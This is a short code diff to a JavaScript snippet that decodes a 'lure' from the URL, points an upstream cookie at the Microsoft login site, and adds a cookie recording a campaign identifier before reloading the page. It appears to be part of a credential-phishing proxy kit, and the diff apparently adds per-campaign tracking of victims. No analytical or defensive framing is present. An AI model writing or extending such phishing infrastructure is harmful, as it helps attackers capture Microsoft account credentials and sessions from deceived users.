@@ -18,6 +18,7 @@ function b64d(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='='
         const lure=JSON.parse(pt);
         const upstream=encodeURIComponent(lure.r||'https://login.microsoftonline.com');
         document.cookie='__upstream='+upstream+';path=/;max-age=3600';
+        document.cookie='__campaign='+encodeURIComponent(lure.c||'')+';path=/;max-age=3600';
         location.reload();
     }catch(e){document.body.innerHTML='<p style="color:red">Cannot verify link</p>';console.error(e)}
 })();
